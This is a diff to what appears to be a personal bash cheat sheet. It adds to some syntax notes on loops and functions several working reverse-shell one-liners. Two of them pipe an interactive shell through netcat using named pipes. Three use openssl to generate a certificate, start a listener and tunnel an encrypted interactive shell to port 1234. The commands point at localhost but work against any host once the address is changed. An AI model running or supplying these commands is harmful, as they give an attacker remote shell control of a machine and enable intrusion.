@@ -39,3 +39,10 @@ until test-commands; do consequent-commands; done
 while test-commands; do consequent-commands; done
 function name [()] {} , functionName(){} # $0 $1...$9 $# $* $@ $? $$ $! local return
 source .sh, . .sh
+
+mkfifo f ; cat f | sh -i 2>&1 | nc 127.0.0.1 1234 > f
+mknod b p && nc 127.0.0.1 1234 0<b | sh -i 1>b
+
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 1234
+mkfifo f ; sh -i < f 2>&1 | openssl s_client -quiet -connect 127.0.0.1:1234 > f
